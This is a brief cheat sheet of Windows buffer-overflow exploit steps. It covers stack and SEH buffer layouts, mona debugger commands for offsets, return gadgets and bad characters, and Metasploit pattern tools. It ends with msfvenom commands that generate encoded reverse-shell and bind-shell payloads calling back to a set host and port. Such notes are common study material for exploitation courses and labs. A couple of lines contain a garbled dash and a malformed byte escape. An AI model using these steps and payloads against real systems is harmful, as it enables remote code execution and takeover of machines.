#Stack Overflow
buffer = junk+ret+shellcode
buffer = "A"*780+"B"*4+"C"*198

#SEH 
buffer = junk + nseh + seh + shellcode
buffer = "A"*1200 + "B"*4 + "C"*4 + "D"*349

# Mona commands
!mona config -set workingfolder c:\logs\%p  # set your working folder
!mona pc 26168 # generate unique pattern of 26168
!mona findmsp # find the offset of unique pattern in registers
!mona jmp -r esp # find instructions which jump to esp like jmp esp, call esp etc.,
!mona bytearray # create byte array from 00 to ff for bad character analysis
!mona compare -f C:\logs\something\bytearray.bin -a 0012ADAD # analyze bytes from 0012ADAD
!mona bytearray â€“cpb "\x00" # byte array without 0x00
!mona bytearray -cpb "\x00\x0a\0x0d"

!mona seh # gives you pop pop ret to get to nseh

bp 0xsomeaddress #set breakpoint

#metasploit 
#Alternate way for createing unique pattern for finding offset
cd /usr/share/metasploit-framework/tools/ & ./pattern_create 2000
./pattern_offset PATTERN

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4321 -e x86/shikata_ga_nai -b 
"\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
msfvenom -p windows/shell_bind_tcp LPORT=4321 -e x86/shikata_ga_nai -b "\x00\x0d\x0a" -i 3 -f c

